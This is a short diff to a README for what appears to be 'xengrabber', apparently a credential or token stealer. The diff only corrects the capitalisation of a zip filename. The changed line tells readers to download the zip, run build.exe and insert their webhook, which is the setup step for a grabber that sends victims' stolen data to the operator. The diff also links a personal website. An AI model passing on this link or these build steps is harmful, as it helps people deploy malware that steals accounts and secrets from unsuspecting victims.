@@ -6,6 +6,6 @@
 
 - modified n' added new features into it.
 
-- download the [xengrabber.zip](https://github.com/xen-light/xengrabber/blob/main/xenGrabber.zip?raw=true) and run the build.exe, put your webhook and voila!
+- download the [xengrabber.zip](https://github.com/xen-light/xengrabber/blob/main/xengrabber.zip?raw=true) and run the build.exe, put your webhook and voila!
 
 - personal website: [https://xenlight.tk](https://xenlight.tk)
